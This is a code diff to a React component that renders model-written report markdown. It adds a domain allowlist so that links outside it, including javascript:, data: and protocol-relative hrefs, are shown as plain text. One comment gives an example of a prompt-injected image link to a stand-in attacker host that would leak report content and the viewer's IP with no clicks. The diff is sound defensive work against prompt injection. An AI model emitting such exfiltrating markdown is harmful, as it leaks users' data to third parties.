@@ -2,10 +2,11 @@
 
 import { createContext, memo, useCallback, useContext, useEffect, useId, useMemo, useRef, useState, type ReactNode } from "react";
 import { createPortal } from "react-dom";
-import Markdown, { type Components } from "react-markdown";
+import Markdown, { type Components, type ExtraProps } from "react-markdown";
 import remarkGfm from "remark-gfm";
 import type { TaskSource } from "@/lib/api";
 import { citeFromProps, remarkCitations } from "./cites";
+import { linkAllowed, linkAllowlist } from "./markdown";
 import { sourceDomain, sourceInitial, sourceLabel } from "./shared";
 import s from "./report.module.css";
 
@@ -19,29 +20,40 @@ interface CiteCtx {
   prefix: string;
   /** DOM id a citation points at, when it isn't the Sources panel (e.g. the console's Evidence list). */
   targetId?: (n: number) => string;
+  /** The domains links may go to (linkAllowlist): any other link in the markdown is shown as its text. */
+  linkDomains: string[];
 }
 
 const CiteContext = createContext<CiteCtx | null>(null);
 
 export function CiteProvider({
   sources,
+  linkDomains,
   jump,
   prefix = "r",
   targetId,
   children,
 }: {
   sources: TaskSource[];
+  /** The domains the report may link to (from the API); defaults to the sources' domains. */
+  linkDomains?: string[] | null;
   jump?: (n: number) => void;
   prefix?: string;
   targetId?: (n: number) => string;
   children: ReactNode;
 }) {
-  const value = useMemo<CiteCtx>(() => ({ byN: new Map(sources.map((x) => [x.n, x])), jump, prefix, targetId }), [sources, jump, prefix, targetId]);
+  const value = useMemo<CiteCtx>(
+    () => ({ byN: new Map(sources.map((x) => [x.n, x])), jump, prefix, targetId, linkDomains: linkAllowlist(linkDomains, sources) }),
+    [sources, linkDomains, jump, prefix, targetId]
+  );
   return <CiteContext.Provider value={value}>{children}</CiteContext.Provider>;
 }
 
 /** DOM id of a source row in the Sources panel. */
 export const sourceDomId = (prefix: string, n: number) => `${prefix}-src-${n}`;
+
+/** An absolute http(s) URL with a host ("https://host…"; not "https:///host" or "https:\\host"). */
+const ABSOLUTE_HTTP = /^https?:\/\/[^\s/\\]/i;
 
 // ---------- Citation chip with popover ----------
 
@@ -95,7 +107,7 @@ function Cite({ n }: { n: number }) {
 
   const domain = sourceDomain(src);
   const popId = `cite-${id.replace(/:/g, "")}`;
-  const external = !ctx?.jump && src.url && /^https?:\/\//i.test(src.url) ? src.url : null;
+  const external = !ctx?.jump && src.url && ABSOLUTE_HTTP.test(src.url) ? src.url : null;
   return (
     <sup className={s.sup}>
       <a
@@ -151,6 +163,28 @@ function Cite({ n }: { n: number }) {
 
 const cell = { whiteSpace: "normal", verticalAlign: "top", minWidth: 110 } as const;
 
+/**
+ * Whether a link in report markdown can be a link at all: an absolute http(s) URL, or an in-page
+ * #anchor (footnotes). Anything else from model output — protocol-relative "//host",
+ * "javascript:", "data:", "mailto:", relative paths, or an href the URL transform emptied —
+ * is shown as its text.
+ */
+export function isLinkableHref(href: string | null | undefined): href is string {
+  return !!href && (ABSOLUTE_HTTP.test(href) || href.startsWith("#"));
+}
+
+/**
+ * A link in report markdown. Model output may carry a prompt-injected link, so only an in-page
+ * #anchor or a URL on a domain the report may link to (the CiteContext's linkDomains, see
+ * linkAllowed) stays a link, however the markdown spelled it; anything else is shown as its text.
+ * This holds whatever the stored text is: the executor's link cleaner is a separate layer.
+ */
+function ReportLink({ node: _node, href, ...props }: JSX.IntrinsicElements["a"] & ExtraProps) {
+  const allowed = useContext(CiteContext)?.linkDomains ?? [];
+  if (!isLinkableHref(href) || !linkAllowed(href, allowed)) return <span>{props.children}</span>;
+  return <a href={href} {...props} {...(href.startsWith("#") ? {} : { target: "_blank", rel: "noopener noreferrer" })} />;
+}
+
 const components: Components = {
   table: ({ node: _node, ...props }) => (
     <div className="tw not-prose" style={{ margin: "16px 0" }}>
@@ -159,9 +193,7 @@ const components: Components = {
   ),
   th: ({ node: _node, style, ...props }) => <th style={{ ...cell, ...style }} {...props} />,
   td: ({ node: _node, style, ...props }) => <td style={{ ...cell, ...style }} {...props} />,
-  a: ({ node: _node, href, ...props }) => (
-    <a href={href} {...props} {...(href && /^https?:/i.test(href) ? { target: "_blank", rel: "noopener noreferrer" } : {})} />
-  ),
+  a: ReportLink,
   // Never load images from model output: the browser fetches an image as soon
   // as the report is viewed, so a prompt-injected ![](https://attacker/?d=…)
   // would leak report content (and the viewer's IP) with zero clicks. Show the alt text.
@@ -177,14 +209,25 @@ export interface ReportMarkdownProps {
   children: string;
   /** Sources whose numbers become citation chips. */
   sources?: TaskSource[] | null;
+  /**
+   * The domains links may go to (the API's linkDomains). Default: the surrounding CiteProvider's,
+   * or without one, these sources' domains.
+   */
+  linkDomains?: string[] | null;
   small?: boolean;
   className?: string;
 }
 
-/** Report markdown (GFM tables, safe links) with [n] citations turned into chips. */
-export const ReportMarkdown = memo(function ReportMarkdown({ children, sources, small, className }: ReportMarkdownProps) {
+/** Report markdown (GFM tables, allowlisted links) with [n] citations turned into chips. */
+export const ReportMarkdown = memo(function ReportMarkdown({ children, sources, linkDomains, small, className }: ReportMarkdownProps) {
+  const ctx = useContext(CiteContext);
   const valid = useMemo(() => new Set((sources ?? []).map((x) => x.n)), [sources]);
   const plugins = useMemo(() => [remarkGfm, [remarkCitations, { valid }]] as NonNullable<Parameters<typeof Markdown>[0]["remarkPlugins"]>, [valid]);
+  // Its own link allowlist when given one, or when no provider gives one (citation chips stay the provider's).
+  const own = useMemo<CiteCtx | null>(
+    () => (linkDomains || !ctx ? { ...(ctx ?? { byN: new Map(), prefix: "r" }), linkDomains: linkAllowlist(linkDomains, sources) } : null),
+    [ctx, linkDomains, sources]
+  );
   const body = (
     <div className={["prose max-w-none", small && "prose-sm", className].filter(Boolean).join(" ")}>
       <Markdown remarkPlugins={plugins} components={components}>
@@ -192,16 +235,16 @@ export const ReportMarkdown = memo(function ReportMarkdown({ children, sources, 
       </Markdown>
     </div>
   );
-  return body;
+  return own ? <CiteContext.Provider value={own}>{body}</CiteContext.Provider> : body;
 });
 
 /** Wraps ReportMarkdown so citations work even without a surrounding ReportView. */
-export function CitedMarkdown({ sources, ...rest }: ReportMarkdownProps) {
+export function CitedMarkdown({ sources, linkDomains, ...rest }: ReportMarkdownProps) {
   const list = useMemo(() => sources ?? [], [sources]);
   const ctx = useContext(CiteContext);
-  if (ctx) return <ReportMarkdown sources={list} {...rest} />;
+  if (ctx) return <ReportMarkdown sources={list} linkDomains={linkDomains} {...rest} />;
   return (
-    <CiteProvider sources={list}>
+    <CiteProvider sources={list} linkDomains={linkDomains}>
       <ReportMarkdown sources={list} {...rest} />
     </CiteProvider>
   );
